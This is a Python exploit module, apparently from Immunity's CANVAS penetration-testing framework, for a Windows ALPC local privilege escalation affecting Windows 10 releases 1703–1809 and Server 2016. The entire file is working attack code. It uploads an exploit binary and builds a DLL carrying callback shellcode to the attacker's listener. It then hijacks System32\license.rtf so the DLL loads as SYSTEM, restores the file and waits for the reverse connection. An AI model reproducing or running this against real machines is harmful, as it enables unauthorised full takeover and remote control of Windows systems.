#!/usr/bin/env python
##ImmunityHeader v1
################################################################################
## File       :  alpc_takeover_lpe.py
## Description:  An elevation of privilege vulnerability exists when Windows
##               improperly handles calls to Advanced Local Procedure Call (ALPC)
## Created_On :  Mon Apr 22 2019
## Created_By :  Nox
##
## (c) Copyright 2019, Immunity, Inc. all rights reserved.
################################################################################

import os
import sys
import time
import struct
import random
import logging

if "." not in sys.path:
    sys.path.append(".")

import canvasengine
from canvaserror import NodeCommandError
from exploitutils import *
from libs.canvasos import canvasos
from shellcode.standalone.windows.payloads64 import payloads as payloads64
from MOSDEF.pelib import PElib
from ExploitTypes.windowsLocalExploit import WindowsLocalExploit


class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)
        self.node                   = None

        self.name                   = NAME
        self.local_path             = os.path.dirname(__file__)
        self.binaries_path          = os.path.join(self.local_path, "Resources")

        self.use_local_interface    = False
        self.autoFind               = False

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def detect_releaseid(self):
        from WindowsConstants import KEY_QUERY_VALUE
        from WindowsConstants import HKEY_LOCAL_MACHINE
        from WindowsConstants import GENERIC_WRITE

        RELEASEID_KEY = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
        hKey = self.node.shell.get_reg_key_handle(HKEY_LOCAL_MACHINE, RELEASEID_KEY, KEY_QUERY_VALUE)

        releaseid = int(self.node.shell.RegQueryValueEx(hKey, "ReleaseID")[2].strip('\0'))

        return releaseid


    def make_dll(self):
        t_os = canvasos('WINDOWS')
        t_os.arch = "x64" if (self.is_64bit_node() or self.has_wow64()) else "x86"

        if t_os.arch == "x64":
            plds = payloads64(dll=True)

            inner_pld = payloads64(module = self, dll=False)
            assembly_inner = inner_pld.callback(self.callback.ip, self.callback.port, universal=True)
            code_inner = inner_pld.assemble(assembly_inner)

            assembly_outer = plds.wrap_payload(code_inner)
            shellcode = plds.assemble(assembly_outer)

            myPElib = PElib(win64=1)
            trojan_dll = myPElib.createPEFileBuf({'DllMain' : shellcode}, gui=False)
        else:
            trojan_dll = self.buildmosdeftrojan(self.callback.ip, self.callback.port,
                                                target_os=t_os, universal=True,
                                                encrypted=False,
                                                dll=True, win8_compatible=True)

            trojan_dll = self.mosdeftrojan

        return trojan_dll

    def write_dll(self):
        windir_path = self.node.shell.GetEnvironmentVariable('SystemRoot')
        if not windir_path:
            logging.error("Could not resolve full WINDIR directory path")
            return False

        dll_name = "%s.dll" % random.randint(10001, 99999)
        local_dll_path = os.path.join(self.binaries_path, dll_name)

        with open(local_dll_path, 'wb') as f:
            f.write(self.make_dll())

        remote_target_path = windir_path + '\\System32\\license.rtf'

        if not self.nodeUpload(local_dll_path, remote_target_path):
            os.unlink(local_dll_path)
            logging.debug("Failed to upload the DLL")
            return False

        os.unlink(local_dll_path)

        return True

    def write_exe(self):
        t_os = canvasos('WINDOWS')
        t_os.arch = "x64" if (self.is_64bit_node() or self.has_wow64()) else "x86"

        xpl_orig_name = "exploit_x86.exe"
        if t_os.arch == "x64":
            xpl_orig_name = "exploit_x64.exe"

        local_exploit_path = os.path.join(self.binaries_path, xpl_orig_name)

        tmp_path = self.node.shell.GetTempPathA()
        if not tmp_path:
            logging.error("Could not resolve full temp directory path")
            return False
        else:
            logging.info("Temp directory: %s" % tmp_path)

        if self.node.shell.chdir(tmp_path) < 0:
            logging.error("Could not chdir into %s" % tmp_path)
            return False

        remote_exploit_name = "%s.exe" % random.randint(10001, 99999)
        remote_exploit_path = tmp_path + remote_exploit_name

        if not self.nodeUpload(local_exploit_path, remote_exploit_path):
            logging.error("Failed to upload the EXE")
            return False

        return remote_exploit_path

    def spawn_process(self, path):
        logging.info("Spawning exploit: %s" % path)

        try:
            cmd_line = path
            ret = self.node.shell.CreateProcessA(cmd_line,
                                                 inherithandles = 0,
                                                 dwCreationFlags = 0x08000000)
        except Exception, ex:
            logging.error("%s" % ex)
            return False

        return ret

    def run(self):
        ret = 0
        for node in self.argsDict["passednodes"]:
            self.node = node

            if not self.is_windows_node():
                continue

            if not any([self.is_win10_node(),
                        self.is_win2016_node()]):
                logging.warning("Not Windows 10/2016")
                continue

            win10 = [1703, 1709, 1803, 1809]
            if self.detect_releaseid() not in win10:
                logging.warning("Windows 10 version detected is not vulnerable")
                return False


            windir_path = self.node.shell.GetEnvironmentVariable('SystemRoot')
            if not windir_path:
                logging.error("Could not resolve full WINDIR directory path")
                return False
            else:
                logging.info("WINDIR directory: %s" % windir_path)

            remote_license_path = windir_path + '\\System32\\license.rtf'

            tmp_license_name = "%s.rtf" % random.randint(10001, 99999)
            local_license_path = os.path.join(self.binaries_path, tmp_license_name)
            try:
                self.node.shell.download(remote_license_path, local_license_path)
            except NodeCommandError as e:
                logging.error('Failed to download %s file' % remote_license_path)
                return False

            remote_exploit_path = self.write_exe()

            logging.info("Exploiting the vulnerability")
            if not self.spawn_process(remote_exploit_path):
                logging.error("Could not spawn %s" % NAME)
                return False

            time.sleep(10)

            isSucess = 0
            logging.info("Writing the file license.rtf")
            logging.info("Waiting for 1 second")
            for i in range(0, 10):
                if self.write_dll():
                    isSucess = 1
                    break
                logging.info("Waiting for %d seconds" % (i + 2))

            self.add_file_for_cleanup(remote_exploit_path)
            self.add_file_for_cleanup(remote_license_path)

            if not isSucess:
                os.unlink(local_license_path)
                return False

            logging.info("Elevating to SYSTEM privileges")
            cmd = remote_exploit_path + ' ' + 'LoadDLL'
            if not self.spawn_process(cmd):
                logging.error("Could not spawn %s" % NAME)

            time.sleep(15)

            if not self.nodeUpload(local_license_path, remote_license_path):
                logging.error("Failed to upload the license.rtf")
                return False

            os.unlink(local_license_path)

            logging.info("Waiting for the callback conection ...")
            logging.info("Waiting for 1 second")
            for i in range(15):
                if self.ISucceeded():
                    ret = 1
                    self.summary[node] = 1
                    break
                time.sleep(2)
                logging.info("Waiting for %d seconds" % (i + 2))
        return ret


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v%s" % (DESCRIPION, VERSION))
    app = theexploit()
    ret = standar_callback_commandline(app)
